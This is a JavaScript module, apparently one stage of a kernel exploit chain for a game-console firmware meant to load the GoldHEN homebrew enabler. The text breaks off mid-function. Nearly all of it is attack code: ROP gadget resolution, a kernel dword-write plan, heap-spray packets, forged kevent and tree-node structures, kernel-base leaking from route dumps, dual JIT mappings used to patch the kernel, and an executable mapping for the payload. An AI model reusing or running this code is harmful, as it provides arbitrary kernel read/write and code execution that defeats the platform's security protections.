import {
  HX1400_P, HX1400_GUARD_RVAS, HX1400_GUARD_WIDTHS, HX1400_GUARD_STOCK,
  HX1400_GUARD_PATCHED, HX1400_CANDIDATES, HX1400_PATCH_HEX,
  HX1400_SOURCE_PINS, HX1400_SYSCALLS,
} from "./hx1400_data.js";
import { sha256 } from "./sha256.js";
import {
  HX1400_GOLDHEN_DUALMAP_OWNER_PROTOCOL,
  HX1400_GOLDHEN_DUALMAP_GS_SOURCE13_RVA,
  HX1400_GOLDHEN_DUALMAP_GS_CANDIDATE_RVAS,
  HX1400_GOLDHEN_DUALMAP_GS_GADGET_BYTES,
  HX1400_GOLDHEN_DUALMAP_DWORD_GADGET_RVA,
  HX1400_GOLDHEN_DUALMAP_SOURCE13_SHA256,
  consumeHx1400GoldhenDualmapOwnerLease,
  runHx1400GoldhenDualmapOwnerOracle,
} from "./hx1400_goldhen_dualmap_owner.js?v=hx1400-goldhen-dualmap-1";

const RESULT_SCHEMA = "oms.fw14-hx1400-goldhen-dualmap.result.v1";
const CLAIM_SCHEMA = "oms.fw14-hx1400-goldhen-dualmap.claim.v1";
export const HX1400_GOLDHEN_DUALMAP_MAX_ARMS = 32;
export const HX1400_GOLDHEN_DUALMAP_ROUNDS = 6;
export const HX1400_GOLDHEN_DUALMAP_PAGE_BYTES = 0x4000;
export const HX1400_GOLDHEN_DUALMAP_PRIMARY_VICTIMS = 96;
export const HX1400_GOLDHEN_DUALMAP_RESERVE_VICTIMS = 96;
export const HX1400_GOLDHEN_DUALMAP_KVA_SEARCH_LIMIT =
  HX1400_GOLDHEN_DUALMAP_PRIMARY_VICTIMS + HX1400_GOLDHEN_DUALMAP_RESERVE_VICTIMS;
export const HX1400_GOLDHEN_DUALMAP_DIAGNOSTIC_PHASES = Object.freeze(["not-started","oracle-entered","round-1-request-validated","round-1-signature-before-ok","round-1-chain-built","round-1-bridge-returned","round-1-signature-after-ok","round-1-complete","round-2-request-validated","round-2-signature-before-ok","round-2-chain-built","round-2-bridge-returned","round-2-signature-after-ok","round-2-complete","authority-consumed","oracle-complete"]);
export const HX1400_GOLDHEN_DUALMAP_DIAGNOSTIC_REASONS = Object.freeze(["none","request-validation","signature-read","signature-mismatch","chain-build","bridge-failed","capture","oracle-module-quarantine","unknown"]);
const NEG_ONE = Object.freeze({ lo: 0xffffffff, hi: 0xffffffff });
export const HX1400_GOLDHEN_DUALMAP_JIT_BYTES = 0x90000;
export const HX1400_GOLDHEN_DUALMAP_RW_MAP_ATTEMPTS = Object.freeze([
  Object.freeze({ address: null, flags: 1 }),
]);
export const HX1400_GOLDHEN_DUALMAP_RX_MAP_ATTEMPTS = Object.freeze([
  Object.freeze({ address: null, flags: 1 }),
]);
export const HX1400_GOLDHEN_DUALMAP_RW_PROTECTION = 3;
export const HX1400_GOLDHEN_DUALMAP_RX_PROTECTION = 5;
export const HX1400_GOLDHEN_DUALMAP_HEN_PROTECTION = 7;
export const HX1400_GOLDHEN_DUALMAP_HEN_FLAGS = 0x1002;
export const HX1400_GOLDHEN_DUALMAP_PATCH_OFFSET = 0;
export const HX1400_GOLDHEN_DUALMAP_HEN_OFFSET = 0x4000;
export const HX1400_GOLDHEN_DUALMAP_HEN_BYTES = 0x89440;
export const HX1400_GOLDHEN_DUALMAP_HEN_SHA256 = "29ec095fbede651e29954de43411599093138791e62105aaee6fdced58edec06";
export const HX1400_GOLDHEN_DUALMAP_HEN_HEAD = "e9a64a0000";
export const HX1400_GOLDHEN_DUALMAP_HEN_ENTRY = 0x4aab;
const ZERO = Object.freeze({ lo: 0, hi: 0 });
const EXPECTED_CANDIDATES = Object.freeze([
  128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72,
  184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240,
]);
const REQUIRED_SYSCALLS = Object.freeze([
  HX1400_SYSCALLS.open, HX1400_SYSCALLS.close, HX1400_SYSCALLS.munmap,
  HX1400_SYSCALLS.socket, HX1400_SYSCALLS.setsockopt, HX1400_SYSCALLS.getsockopt,
  HX1400_SYSCALLS.fstat, HX1400_SYSCALLS.sysctl, HX1400_SYSCALLS.kqueue,
  HX1400_SYSCALLS.kevent, HX1400_SYSCALLS.mmap, HX1400_SYSCALLS.jitshmCreate,
  HX1400_SYSCALLS.getpid,
  HX1400_SYSCALLS.cpusetGetaffinity, HX1400_SYSCALLS.cpusetSetaffinity,
  HX1400_SYSCALLS.aioMultiDelete, HX1400_SYSCALLS.aioMultiPoll,
  HX1400_SYSCALLS.aioMultiCancel, HX1400_SYSCALLS.aioSubmitCmd,
]);
export function matchesHx1400GoldhenDualmapGsGadgetSignature(first, second) {
  if (
    first === null || second === null ||
    !Number.isInteger(first.lo) || !Number.isInteger(first.hi) ||
    !Number.isInteger(second.lo) || !Number.isInteger(second.hi)
  ) return false;
  const bytes = [
    first.lo & 0xff, (first.lo >>> 8) & 0xff,
    (first.lo >>> 16) & 0xff, (first.lo >>> 24) & 0xff,
    first.hi & 0xff, (first.hi >>> 8) & 0xff,
    (first.hi >>> 16) & 0xff, (first.hi >>> 24) & 0xff,
    second.lo & 0xff, (second.lo >>> 8) & 0xff,
    (second.lo >>> 16) & 0xff,
  ];
  return bytes.every(
    (value, index) => value === HX1400_GOLDHEN_DUALMAP_GS_GADGET_BYTES[index],
  );
}
export function resolveHx1400GoldhenDualmapGsGadgetRva(readSignature) {
  if (typeof readSignature !== "function") throw new TypeError("readSignature");
  let invalid = false;
  let matches = 0;
  let resolved = null;
  for (const rva of HX1400_GOLDHEN_DUALMAP_GS_CANDIDATE_RVAS) {
    const first = readSignature(rva);
    const second = readSignature(rva);
    const valid =
      first !== null && typeof first === "object" &&
      second !== null && typeof second === "object" &&
      first.qword0 !== null && typeof first.qword0 === "object" &&
      first.qword8 !== null && typeof first.qword8 === "object" &&
      second.qword0 !== null && typeof second.qword0 === "object" &&
      second.qword8 !== null && typeof second.qword8 === "object" &&
      Number.isInteger(first.qword0.lo) && Number.isInteger(first.qword0.hi) &&
      Number.isInteger(first.qword8.lo) && Number.isInteger(first.qword8.hi) &&
      Number.isInteger(second.qword0.lo) && Number.isInteger(second.qword0.hi) &&
      Number.isInteger(second.qword8.lo) && Number.isInteger(second.qword8.hi);
    if (!valid) {
      invalid = true;
      continue;
    }
    const stable =
      first.qword0.lo === second.qword0.lo &&
      first.qword0.hi === second.qword0.hi &&
      first.qword8.lo === second.qword8.lo &&
      first.qword8.hi === second.qword8.hi;
    if (!stable) {
      invalid = true;
      continue;
    }
    if (matchesHx1400GoldhenDualmapGsGadgetSignature(first.qword0, first.qword8)) {
      matches += 1;
      if (resolved === null) resolved = rva;
    }
  }
  return !invalid && matches === 1 ? resolved : null;
}
export function buildHx1400GoldhenDualmapDwordWritePlan(address, value) {
  if (
    address === null ||
    typeof address !== "object" ||
    !Number.isInteger(address.lo) ||
    !Number.isInteger(address.hi) ||
    !Number.isInteger(value) ||
    value < 0 ||
    value > 0xffffffff
  ) throw new TypeError("invalid dword write plan");
  return Object.freeze({
    popRdiRva: HX1400_P[23],
    target: Object.freeze({ lo: address.lo >>> 0, hi: address.hi >>> 0 }),
    popRaxRva: HX1400_P[21],
    scalar: Object.freeze({ lo: value >>> 0, hi: 0 }),
    writeRva: HX1400_GOLDHEN_DUALMAP_DWORD_GADGET_RVA,
    rbpFiller: ZERO,
    width: 4,
  });
}


export function validHx1400GoldhenDualmapPage(page) {
  if (
    page === null ||
    typeof page !== "object" ||
    !Number.isInteger(page.lo) ||
    !Number.isInteger(page.hi) ||
    page.lo < 0 ||
    page.lo > 0xffffffff ||
    page.hi !== 0
  )
    return false;
  return (
    page.lo >= 0x100000 &&
    page.lo % HX1400_GOLDHEN_DUALMAP_PAGE_BYTES === 0 &&
    page.lo + HX1400_GOLDHEN_DUALMAP_PAGE_BYTES <= 0x100000000
  );
}


function put64(view, offset, value) {
  view.setUint32(offset, value.lo >>> 0, true);
  view.setUint32(offset + 4, value.hi >>> 0, true);
}

function get64(view, offset) {
  return { lo: view.getUint32(offset, true), hi: view.getUint32(offset + 4, true) };
}

function add64(value, amount) {
  const low = ((value.lo >>> 0) + (amount >>> 0)) >>> 0;
  return { lo: low, hi: ((value.hi >>> 0) + (low < (value.lo >>> 0) ? 1 : 0)) >>> 0 };
}

function sub64(value, amount) {
  const low = ((value.lo >>> 0) - (amount >>> 0)) >>> 0;
  return { lo: low, hi: ((value.hi >>> 0) - (low > (value.lo >>> 0) ? 1 : 0)) >>> 0 };
}

function same64(a, b) {
  return (a.lo >>> 0) === (b.lo >>> 0) && (a.hi >>> 0) === (b.hi >>> 0);
}

function validQword(value) {
  return (
    value !== null &&
    typeof value === "object" &&
    Number.isInteger(value.lo) &&
    Number.isInteger(value.hi) &&
    value.lo >= 0 &&
    value.lo <= 0xffffffff &&
    value.hi >= 0 &&
    value.hi <= 0xffffffff
  );
}

function validUserJitMapping(value) {
  if (!validQword(value) || (value.lo & (HX1400_GOLDHEN_DUALMAP_PAGE_BYTES - 1)) !== 0)
    return false;
  const end = add64(value, HX1400_GOLDHEN_DUALMAP_JIT_BYTES - 1);
  return (value.hi >>> 0) < 0x8000 && (end.hi >>> 0) < 0x8000;
}

function compare64(a, b) {
  const ahi = a.hi >>> 0;
  const bhi = b.hi >>> 0;
  if (ahi !== bhi) return ahi < bhi ? -1 : 1;
  const alo = a.lo >>> 0;
  const blo = b.lo >>> 0;
  return alo === blo ? 0 : (alo < blo ? -1 : 1);
}

export function validateHx1400GoldhenDualmapNonoverlap(
  writable,
  executable,
  length = HX1400_GOLDHEN_DUALMAP_JIT_BYTES,
) {
  if (!validUserJitMapping(writable) || !validUserJitMapping(executable))
    return false;
  if (!Number.isInteger(length) || length <= 0 || length > HX1400_GOLDHEN_DUALMAP_JIT_BYTES)
    return false;
  const writableEnd = add64(writable, length - 1);
  const executableEnd = add64(executable, length - 1);
  return compare64(writableEnd, executable) < 0 || compare64(executableEnd, writable) < 0;
}

export function acquireHx1400GoldhenDualmapView(
  fd,
  protection,
  attempts,
  mmap,
  retain,
) {
  if (!Number.isInteger(fd) || fd < 0) throw new TypeError("invalid JIT descriptor");
  if (
    protection !== HX1400_GOLDHEN_DUALMAP_RW_PROTECTION &&
    protection !== HX1400_GOLDHEN_DUALMAP_RX_PROTECTION
  ) throw new TypeError("invalid JIT view protection");
  if (
    !Array.isArray(attempts) ||
    attempts.length !== 1 ||
    attempts[0] === null ||
    attempts[0].address !== null ||
    attempts[0].flags !== 1
  ) throw new TypeError("invalid JIT view attempts");
  if (typeof mmap !== "function" || typeof retain !== "function")
    throw new TypeError("invalid JIT mapping callbacks");
  const mapping = mmap(
    null,
    HX1400_GOLDHEN_DUALMAP_JIT_BYTES,
    protection,
    1,
    fd,
    0,
  );
  if (!validQword(mapping)) throw new TypeError("invalid mmap result");
  if (same64(mapping, NEG_ONE) || same64(mapping, ZERO)) return null;
  if (!validUserJitMapping(mapping))
    throw new TypeError("floating mmap returned an invalid user mapping");
  retain(mapping);
  return mapping;
}

export function acquireHx1400GoldhenDualmapWritableView(fd, mmap, retain) {
  return acquireHx1400GoldhenDualmapView(
    fd,
    HX1400_GOLDHEN_DUALMAP_RW_PROTECTION,
    HX1400_GOLDHEN_DUALMAP_RW_MAP_ATTEMPTS,
    mmap,
    retain,
  );
}

export function acquireHx1400GoldhenDualmapExecutableView(fd, mmap, retain) {
  return acquireHx1400GoldhenDualmapView(
    fd,
    HX1400_GOLDHEN_DUALMAP_RX_PROTECTION,
    HX1400_GOLDHEN_DUALMAP_RX_MAP_ATTEMPTS,
    mmap,
    retain,
  );
}

export function cleanupHx1400GoldhenDualmapJitViews(
  writable,
  executable,
  fd,
  unmap,
  close,
) {
  if (writable !== null && !validQword(writable))
    throw new TypeError("invalid writable JIT view");
  if (executable !== null && !validQword(executable))
    throw new TypeError("invalid executable JIT view");
  if (!Number.isInteger(fd) || fd < -1)
    throw new TypeError("invalid JIT descriptor");
  if (typeof unmap !== "function" || typeof close !== "function")
    throw new TypeError("invalid JIT cleanup callbacks");
  let retainedWritable = writable;
  let retainedExecutable = executable;
  let retainedFd = fd;
  if (retainedExecutable !== null) {
    let released = false;
    try {
      released = unmap(retainedExecutable, HX1400_GOLDHEN_DUALMAP_JIT_BYTES) === true;
    } catch (_) {}
    if (!released) return Object.freeze({
      ok:false,writable:retainedWritable,executable:retainedExecutable,fd:retainedFd,
      reason:"executable JIT view cleanup failed",
    });
    retainedExecutable = null;
  }
  if (retainedWritable !== null) {
    let released = false;
    try {
      released = unmap(retainedWritable, HX1400_GOLDHEN_DUALMAP_JIT_BYTES) === true;
    } catch (_) {}
    if (!released) return Object.freeze({
      ok:false,writable:retainedWritable,executable:retainedExecutable,fd:retainedFd,
      reason:"writable JIT view cleanup failed",
    });
    retainedWritable = null;
  }
  if (retainedFd >= 0) {
    let released = false;
    try {
      released = close(retainedFd) === true;
    } catch (_) {}
    if (!released) return Object.freeze({
      ok:false,writable:retainedWritable,executable:retainedExecutable,fd:retainedFd,
      reason:"JIT descriptor cleanup failed",
    });
    retainedFd = -1;
  }
  return Object.freeze({
    ok:true,writable:retainedWritable,executable:retainedExecutable,fd:retainedFd,
    reason:"none",
  });
}

export function mapHx1400GoldhenDualmapPostpatchHen(mmap, retain) {
  if (typeof mmap !== "function" || typeof retain !== "function")
    throw new TypeError("invalid HEN mapping callbacks");
  const mapping = mmap(
    0,
    HX1400_GOLDHEN_DUALMAP_JIT_BYTES,
    HX1400_GOLDHEN_DUALMAP_HEN_PROTECTION,
    HX1400_GOLDHEN_DUALMAP_HEN_FLAGS,
    -1,
    0,
  );
  if (!validQword(mapping)) throw new TypeError("invalid HEN mmap result");
  if (same64(mapping, NEG_ONE) || same64(mapping, ZERO) || !validUserJitMapping(mapping))
    return null;
  retain(mapping);
  return mapping;
}

function strictRouteKernelPointer(value) {
  return value !== null && value !== undefined && (value.hi >>> 0) === 0xffffffff;
}

export function isHx1400Current(value) {
  return (
    value !== null &&
    value !== undefined &&
    (((value.lo >>> 0) !== 0) || ((value.hi >>> 0) !== 0)) &&
    ((value.hi >>> 16) & 0xffff) === 0xffff
  );
}

function pointerResult(result) {
  const lo = result.lo === undefined ? result.low : result.lo;
  return { lo: lo >>> 0, hi: result.hi >>> 0 };
}

function toHex(value) {
  return `0x${(value.hi >>> 0).toString(16).padStart(8, "0")}${(value.lo >>> 0).toString(16).padStart(8, "0")}`;
}

function bytesFromHex(hex) {
  const out = new Uint8Array(hex.length >>> 1);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return out;
}
function digestHex(digest) {
  if (!(digest instanceof Uint8Array) || digest.length !== 32)
    throw new TypeError("sha256 must return 32 bytes");
  let text = "";
  for (const byte of digest) text += byte.toString(16).padStart(2, "0");
  return text;
}


export function validateHx1400GoldhenDualmapConstants() {
  const faults = [];
  if (HX1400_P.length !== 31) faults.push("P length");
  const guards = HX1400_GUARD_RVAS.length;
  if (
    guards !== 24 ||
    HX1400_GUARD_WIDTHS.length !== guards ||
    HX1400_GUARD_STOCK.length !== guards ||
    HX1400_GUARD_PATCHED.length !== guards
  ) faults.push("guard table");
  if (
    HX1400_CANDIDATES.length !== EXPECTED_CANDIDATES.length ||
    !HX1400_CANDIDATES.every((value, index) => value === EXPECTED_CANDIDATES[index])
  ) faults.push("candidate order");
  if (
    HX1400_PATCH_HEX.length !== 1264 ||
    !/^[0-9a-f]+$/.test(HX1400_PATCH_HEX) ||
    HX1400_P[12] !== HX1400_SOURCE_PINS.anchorRva ||
    HX1400_P[29] + 1 !== HX1400_GOLDHEN_DUALMAP_DWORD_GADGET_RVA ||
    HX1400_GOLDHEN_DUALMAP_HEN_OFFSET + HX1400_GOLDHEN_DUALMAP_HEN_BYTES >= HX1400_GOLDHEN_DUALMAP_JIT_BYTES
  ) faults.push("source pins");
  return Object.freeze({
    ok: faults.length === 0,
    faults: Object.freeze(faults),
    candidates: HX1400_CANDIDATES.length,
    guards,
    patchBytes: HX1400_PATCH_HEX.length >>> 1,
    maxArms: HX1400_GOLDHEN_DUALMAP_MAX_ARMS,
    rounds: HX1400_GOLDHEN_DUALMAP_ROUNDS,
  });
}

export function buildHx1400CandidateSchedule(sprayLength) {
  if (!Number.isInteger(sprayLength) || sprayLength < 0 || sprayLength > 0x10000)
    throw new TypeError("invalid spray length");
  const schedule = [];
  for (let round = 1; round <= HX1400_GOLDHEN_DUALMAP_ROUNDS; round++) {
    for (const candidateIndex of HX1400_CANDIDATES) {
      if (candidateIndex < sprayLength)
        schedule.push(Object.freeze({ round, candidateIndex }));
    }
  }
  return Object.freeze(schedule);
}

export function deriveChallengeWord(original, challengeHex) {
  if (!original || !Number.isInteger(original.lo) || !Number.isInteger(original.hi) || !/^[0-9a-f]{64}$/.test(challengeHex)) throw new TypeError("invalid challenge input");
  const domain = new TextEncoder().encode("OMS-HX1400-KPTR16-KRW-PROOF-V1");
  const material = new Uint8Array(domain.length + 32 + 12);
  material.set(domain);
  material.set(bytesFromHex(challengeHex), domain.length);
  const view = new DataView(material.buffer);
  view.setUint32(domain.length + 32, original.lo >>> 0, true);
  view.setUint32(domain.length + 36, original.hi >>> 0, true);
  view.setUint32(domain.length + 40, HX1400_SOURCE_PINS.challengeRva >>> 0, true);
  const digest = sha256(material);
  let lowByte = original.lo & 0xff;
  for (const candidate of digest) {
    if (candidate !== lowByte) {
      lowByte = candidate;
      break;
    }
  }
  if (lowByte === (original.lo & 0xff)) lowByte = (lowByte + 1) & 0xff;
  return Object.freeze({ lo: ((original.lo & 0xffffff00) | lowByte) >>> 0, hi: original.hi >>> 0 });
}

export function deriveHx1400GoldhenDualmapChallenge(challengeHex) {
  if (!/^[0-9a-f]{64}$/.test(challengeHex))
    throw new TypeError("invalid oracle challenge");
  const domain = new TextEncoder().encode("OMS-HX1400-GOLDHEN-OWNER-V1");
  const material = new Uint8Array(domain.length + 32);
  material.set(domain);
  material.set(bytesFromHex(challengeHex), domain.length);
  const digest = sha256(material);
  const view = new DataView(digest.buffer, digest.byteOffset, digest.byteLength);
  return Object.freeze({
    lo: view.getUint32(0, true),
    hi: view.getUint32(4, true),
  });
}

export function buildRouteMib() {
  const view = new DataView(new ArrayBuffer(24));
  [4, 17, 0, 28, 1, 0].forEach((value, index) => view.setInt32(index * 4, value, true));
  return new Uint8Array(view.buffer);
}

export function buildAioRequests() {
  const view = new DataView(new ArrayBuffer(200));
  for (let i = 0; i < 5; i++) {
    view.setInt32(i * 40 + 8, 0, true);
    view.setInt32(i * 40 + 32, -1, true);
  }
  return new Uint8Array(view.buffer);
}

export function buildSprayPacket() {
  const out = new Uint8Array(512);
  const view = new DataView(out.buffer);
  out[1] = 30;
  out[3] = 15;
  for (let offset = 8; offset + 8 <= 248; offset += 8) {
    view.setUint32(offset, 1128481603, true);
    view.setUint32(offset + 4, 1414812756, true);
  }
  return out;
}

export function buildMembershipOption(kind) {
  const out = new Uint8Array(kind === "block" ? 12 : 8);
  out.set(kind === "source" ? [0xef, 0xff, 0xff, 0xfa] : [0xef, 0xff, 0xff, 0xf9]);
  if (kind === "block") out.set([0xc0, 0, 2, 1], 4);
  return out;
}

export function buildKevent(ident, filter, flags, data = 0) {
  const view = new DataView(new ArrayBuffer(64));
  if (typeof ident === "number") view.setUint32(0, ident >>> 0, true);
  else put64(view, 0, ident);
  view.setInt16(8, filter, true);
  view.setUint16(10, flags, true);
  view.setInt32(16, data, true);
  return new Uint8Array(view.buffer);
}

export function buildRbNode(left, right, parent, color, ordinal) {
  const view = new DataView(new ArrayBuffer(48));
  put64(view, 0, left || ZERO);
  put64(view, 8, right || ZERO);
  put64(view, 16, parent || ZERO);
  view.setInt32(24, color, true);
  view.setInt32(32, ordinal, true);
  view.setUint8(36, 1);
  view.setUint8(37, 1);
  return new Uint8Array(view.buffer);
}

export function parseRouteDump(bytes, anchorRva = HX1400_SOURCE_PINS.anchorRva) {
  const data = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  const view = new DataView(data.buffer, data.byteOffset, data.byteLength);
  let offset = 0;
  let base = null;
  let hits = 0;
  let ambiguous = false;
  while (offset + 16 <= data.length) {
    const length = view.getUint16(offset, true);
    if (length < 16 || offset + length > data.length) break;
    if (view.getUint8(offset + 3) === 4 && length >= 40) {
      const candidate = { lo: view.getUint32(offset + 32, true), hi: view.getUint32(offset + 36, true) };
      if (strictRouteKernelPointer(candidate) && candidate.lo !== 0 && candidate.lo !== 0xffffffff) {
        const derived = sub64(candidate, anchorRva);
        if ((derived.lo & 0x3fff) === 0 && strictRouteKernelPointer(derived)) {
          hits++;
          if (base === null) base = derived;
          else if (!same64(base, derived)) ambiguous = true;
        }
      }
    }
    offset += length;
  }
  return Object.freeze({ base: base === null || ambiguous ? null : Object.freeze(base), hits, ambiguous });
}

function exactKeys(object, keys) {
  if (object === null || typeof object !== "object" || Array.isArray(object)) return false;
  const actual = Object.keys(object).sort();
  const expected = keys.slice().sort();
  return actual.length === expected.length && actual.every((key, index) => key === expected[index]);
}

function validateClaim(context) {
  const claim = context.claim;
  if (!exactKeys(claim, ["schema", "run_id", "challenge_hex", "max_arms", "patch", "hen"]))
    throw new Error("claim shape");
  if (
    claim.schema !== CLAIM_SCHEMA ||
    typeof claim.run_id !== "string" ||
    claim.run_id.length === 0 ||
    claim.run_id.length > 128 ||
    !/^[0-9a-f]{64}$/.test(claim.challenge_hex) ||
    claim.max_arms !== HX1400_GOLDHEN_DUALMAP_MAX_ARMS
  ) throw new Error("claim identity");
  if (
    !exactKeys(claim.patch, ["sha256", "size", "offset"]) ||
    claim.patch.sha256 !== HX1400_SOURCE_PINS.patchSha256 ||
    claim.patch.size !== HX1400_SOURCE_PINS.patchBytes ||
    claim.patch.offset !== HX1400_GOLDHEN_DUALMAP_PATCH_OFFSET
  ) throw new Error("patch claim");
  if (
    !exactKeys(claim.hen, ["sha256", "size", "offset", "head", "entry"]) ||
    claim.hen.sha256 !== HX1400_GOLDHEN_DUALMAP_HEN_SHA256 ||
    claim.hen.size !== HX1400_GOLDHEN_DUALMAP_HEN_BYTES ||
    claim.hen.offset !== HX1400_GOLDHEN_DUALMAP_HEN_OFFSET ||
    claim.hen.head !== HX1400_GOLDHEN_DUALMAP_HEN_HEAD ||
    claim.hen.entry !== HX1400_GOLDHEN_DUALMAP_HEN_ENTRY
  ) throw new Error("HEN claim");
}

class HxFailure extends Error {
  constructor(code, detail) {
    super(detail || code);
    this.code = code;
  }
}

function baseResult(context) {
  const validContext = context !== null && typeof context === "object";
  const claim = validContext ? context.claim : null;
  return {
    schema: RESULT_SCHEMA,
    ok: false,
    code: "INITIALIZING",
    runId: claim && typeof claim.run_id === "string" ? claim.run_id : "",
    kbaseValidated: false,
    maxArms: HX1400_GOLDHEN_DUALMAP_MAX_ARMS,
    armsAttempted: 0,
    possibleBlindWrites: 0,
    armRecords: [],
    pairEstablished: false,
    pairRound: null,
    pairCandidateIndex: null,
    pairCandidateFd: null,
    pairTargetIndex: null,
    pairTargetFd: null,
    kvaSearchOutcome: null,
    kvaSearchAttempts: 0,
    kvaSearchFd: null,
    kvaSearchRc: null,
    kvaSearchRef: 0,
    kvaSearchTreeAccepted: false,
    rotationAttempted: false,
    rotationError: null,
    rotationRc: null,
    rotationExpectedOpsMatch: false,
    rotationPredicateMask: null,
    kernelRwProved: false,
    challengeWriteAttempted: false,
    challengeWritten: false,
    challengeRestored: false,
    lowMapPolicyValidated: false,
    lowMapMapped: false,
    lowMapLeaseAcquired: false,
    lowMapUnmapped: false,
    lowMapLeaseRevoked: false,
    oracleAttempted: false,
    oracleCode: null,
    oracleKernelMutated: false,
    oracleCleanup: false,
    oracleRebootRequired: false,
    oracleExecutions: 0,
    oracleSignatureVerified: false,
    oracleRopReadOnly: false,
    oracleAuthorityConsumed: false,
    oracleDiagnosticPhase: "not-started",
    oracleDiagnosticReason: "none",
    oracleSignatureChecks: 0,
    oracleRoundsStarted: 0,
    oracleRoundsCompleted: 0,
    currentObjectsAuthenticated: false,
    handlerSemanticAttested: false,
    mmapCapabilityRecheckAttested: false,
    dwordGadgetAttested: false,
    ownerRevalidated: false,
    writerIsolationVerified: false,
    leaseStatus: null,
    leaseWrites: 0,
    leaseCreateCalls: 0,
    leaseMapCalls: 0,
    leaseWriteArmConfirmed: false,
    leaseWriteRestoreConfirmed: false,
    leaseExecuteArmConfirmed: false,
    leaseExecuteRestoreConfirmed: false,
    leaseBorrowedBitsCleared: false,
    leaseTerminalMatchesOriginal: false,
    jitDescriptorCreated: false,
    jitDescriptorReleased: false,
    jitWritableMappingCreated: false,
    jitExecutableMappingCreated: false,
    jitMappingsCapabilityBound: false,
    jitMappingsReleased: false,
    wxPatchMappingVerified: false,
    crossViewPatchVerified: false,
    patchCopyVerified: false,
    henRwxMapCreated: false,
    henCopyVerified: false,
    bssTailVerified: false,
    henMappingRetained: false,
    stockGuardsVerified: 0,
    patchedGuardsVerified: 0,
    patchExecutionAttempted: false,
    bridgeCallbackRestored: false,
    sysent11Restored: false,
    goldhenLaunchAttempted: false,
    goldhenLaunchDispatched: false,
    goldhenRuntimeObserved: false,
    exploitRetired: false,
    aioCleanupVerified: true,
    quarantined: false,
    stageCleanupVerified: false,
    hostCleanupVerified: false,
    cleanupVerified: false,
    rebootRequired: false,
  };
}

export function finalizeHx1400GoldhenDualmapHostCleanup(stageResult, hostCleanupVerified) {
  if (
    stageResult === null ||
    typeof stageResult !== "object" ||
    typeof stageResult.ok !== "boolean" ||
    typeof stageResult.code !== "string" ||
    typeof stageResult.stageCleanupVerified !== "boolean" ||
    typeof hostCleanupVerified !== "boolean"
  ) throw new TypeError("invalid host cleanup result");
  return Object.freeze({
    ...stageResult,
    ok: stageResult.ok && hostCleanupVerified,
    code:
      !hostCleanupVerified && stageResult.ok
        ? "HOST_CLEANUP_UNVERIFIED"
        : stageResult.code,
    hostCleanupVerified,
    cleanupVerified:
      stageResult.stageCleanupVerified && hostCleanupVerified,
    rebootRequired: true,
  });
}

export function selectHx1400GoldhenDualmapFailureCode(
  code,
  oracleAttempted,
  oracleCleanup,
  oracleRebootRequired,
  stageCleanupVerified,
) {
  if (
    typeof code !== "string" ||
    typeof oracleAttempted !== "boolean" ||
    typeof oracleCleanup !== "boolean" ||
    typeof oracleRebootRequired !== "boolean" ||
    typeof stageCleanupVerified !== "boolean"
  ) throw new TypeError("invalid failure classification");
  return (
    oracleAttempted &&
    oracleCleanup &&
    !oracleRebootRequired &&
    !stageCleanupVerified
  ) ? "STAGE_CLEANUP_UNVERIFIED" : code;
}

export function deriveHx1400GoldhenDualmapExploitRetired(
  stageCleanupVerified,
  exploitAuthorityEstablished,
) {
  if (
    typeof stageCleanupVerified !== "boolean" ||
    typeof exploitAuthorityEstablished !== "boolean"
  ) throw new TypeError("invalid exploit retirement classification");
  return stageCleanupVerified && exploitAuthorityEstablished;
}

export async function runHx1400GoldhenDualmapStage(context) {
  const result = baseResult(context);
  const state = {
    owned: new Set(), retained: new Set(), buffers: [], armed: false, slotRotated: false,
    slotMutationAttempted: false, slotOriginalVerified: false, slotAddress: null,
    slotOriginal: null, slotRestored: false, bridgeDeleted: false, exploitRetired: false,
    exploitAuthorityEstablished: false,
    affinitySaved: false, fakePage: null, fake: null, fakeOps: null,
    lowMapLease: null,
    eventBuffer: null, bridgeKq: -1, exploitKq: -1,
    dceFd: -1, anchor: -1, targetFd: -1, targetFreed: false, targetRepaired: false,
    pairEstablished: false, sprayPacket: null, optRead: null, optLen: null,
    spray: [], victims: [], plugs: [], originalAffinity: null, quarantine: false,
    quarantineRetained: false, dceHostCloseAttempted: false,
    eventDeleteHazard: false, challengeAddress: null,
    challengeOriginal: null, challengeMayBeDirty: false,
    oracleResources: [], oracleExecuteRound: 0, oracleSignatureChecks: 0,
    oracleRoundsCompleted: 0, oracleRoundsStarted: 0, oracleAuthorityConsumed: false,
    bridgeCallActive: false, credentialWriterGeneration: 0,
    credentialWriterActive: false, jitFd: -1, jitRwMap: null, jitRxMap: null,
    henMap: null, patchExecutionAmbiguous: false, launchAmbiguous: false,
  };
  let p;
  let int64;
  let syscall;
  let emit;
  let check;
  let hen = null;
  let patchBytes = null;

  const fail = (code, detail) => { throw new HxFailure(code, detail); };
  const note = (tag, detail) => { try { emit(tag, String(detail)); } catch (_) {} };
  const asserted = (name, ok, detail) => {
    try { check(name, !!ok, String(detail)); } catch (_) {}
    if (!ok) fail(name, detail);
  };

  const q = (value) => new int64(value.lo >>> 0, value.hi >>> 0);
  const addr = (base, offset) => q(add64(base, offset));
  const ka = (rva) => add64(state.kbase, rva);
  const read8 = (where) => pointerResult(p.read8(q(where)));
  const write8 = (where, value) => p.write8(q(where), q(value));
  const read4 = (where) => p.read4(q(where)) >>> 0;
  const write4 = (where, value) => p.write4(q(where), value >>> 0);
  const write2 = (where, value) => p.write2(q(where), value & 0xffff);
  const write1 = (where, value) => p.write1(q(where), value & 0xff);
  const zeroMemory = (where, length) => {
    for (let offset = 0; offset + 8 <= length; offset += 8) write8(add64(where, offset), ZERO);
    for (let offset = length & ~7; offset < length; offset++) write1(add64(where, offset), 0);
  };
  const copyTo = (where, bytes) => {
    let offset = 0;
    const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
    for (; offset + 8 <= bytes.length; offset += 8) write8(add64(where, offset), get64(view, offset));
    for (; offset < bytes.length; offset++) write1(add64(where, offset), bytes[offset]);
  };
  const copyBuffer = (buffer, bytes) => new Uint8Array(buffer).set(bytes);
  const bufferAddress = (buffer) => q(pointerResult(context.bufAddr(buffer)));
  const sc = (number, ...args) => syscall(number, ...args);
  const closeFd = (fd) => {
    if (!state.owned.has(fd)) return true;
    try {
